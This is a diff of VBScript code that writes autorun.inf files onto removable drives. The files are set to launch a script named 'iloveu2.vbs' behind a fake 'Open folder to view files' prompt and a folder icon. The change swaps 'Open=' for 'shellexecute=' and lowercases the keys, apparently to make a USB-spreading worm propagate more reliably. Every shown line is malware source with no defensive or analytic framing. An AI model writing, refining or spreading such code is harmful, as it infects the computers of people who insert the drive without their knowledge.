@@ -27,16 +27,16 @@ if drive.drivetype = 1 or drive.drivetype = 2 then
 set file = fso.createtextfile(drive&"\autorun.inf")
 file.writeline ";"&rnd
 file.writeline ";"&rnd
-file.writeline "[Autorun]"
+file.writeline "[autorun]"
 file.writeline ";"&rnd
 file.writeline ";"&rnd
 file.writeline ";"&rnd
-file.writeline "Action=Open folder to view files"
+file.writeline "action=Open folder to view files"
 file.writeline ";"&rnd
 file.writeline ";"&rnd
-file.writeline "Open="&drive&"\iloveu2.vbs"
+file.writeline "shellexecute="&drive&"\iloveu2.vbs"
 file.writeline ";"&rnd
-file.writeline "Icon="&windows&"\System32\shell32.dll,4"
+file.writeline "icon="&windows&"\System32\shell32.dll,4"
 file.writeline ";"&rnd
 file.writeline ";"&rnd
 file.close
